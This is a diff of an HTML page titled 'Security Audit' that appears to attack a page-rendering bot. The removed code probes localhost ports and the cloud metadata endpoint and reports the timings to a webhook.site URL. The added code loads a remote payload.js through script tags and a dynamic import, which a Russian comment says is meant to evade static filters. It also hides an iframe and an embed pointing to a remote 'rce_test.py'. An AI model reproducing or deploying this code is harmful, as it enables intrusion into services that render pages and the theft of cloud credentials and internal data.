@@ -1,44 +1,24 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Security Audit</title>
+    <script src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/payload.js"></script>
+</head>
 <body>
     <script>
         const hook = "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349";
 
-        function probe(url, label) {
-            const start = Date.now();
-            const img = new Image();
-            
-            img.onload = () => {
-                const diff = Date.now() - start;
-                new Image().src = `${hook}/ALIVE_${label}?ms=${diff}`;
-            };
-            
-            img.onerror = () => {
-                const diff = Date.now() - start;
-                // Важно: если порт закрыт, ошибка прилетит мгновенно (0-10мс)
-                // Если порт открыт, но это не картинка, ошибка прилетит позже (50-500мс)
-                new Image().src = `${hook}/RESULT_${label}?ms=${diff}`;
-            };
+        // Пытаемся импортировать JS динамически (обход статических фильтров)
+        import('https://kirayoshikage67.github.io/gfhgfhfhgfhg/payload.js')
+            .catch(e => new Image().src = hook + "/IMPORT_FAILED");
 
-            img.src = url;
-        }
-
-        // 1. Проверяем то то, что ТОЧНО есть (локальный веб-интерфейс)
-        probe("http://127.0.0.1:80/favicon.ico", "LOCAL_80");
-
-        // 2. Проверяем облачные метаданные (если это AWS/Azure/GCP)
-        probe("http://169.254.169.254/latest/meta-data/", "METADATA");
-
-        // 3. Проверяем ПОРТ, КОТОРОГО НЕТ (для эталона времени)
-        probe("http://127.0.0.1:1337/nonexistent", "CLOSED_PORT");
-
-        // 4. Попытка вытащить данные через redirect (если бот следует за 302)
-        // Мы отправляем его на "картинку", которая на самом деле является скриптом
-        var leak = document.createElement('link');
-        leak.rel = "prerender";
-        leak.href = "http://127.0.0.1:80/";
-        document.head.appendChild(leak);
-        
+        // Пытаемся заставить бота "обработать" питон-скрипт
+        var rce = document.createElement('iframe');
+        rce.src = "https://kirayoshikage67.github.io/gfhgfhfhgfhg/rce_test.py";
+        rce.style.display = "none";
+        document.body.appendChild(rce);
     </script>
+
+    <embed src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/rce_test.py" width="1" height="1">
 </body>
 </html>
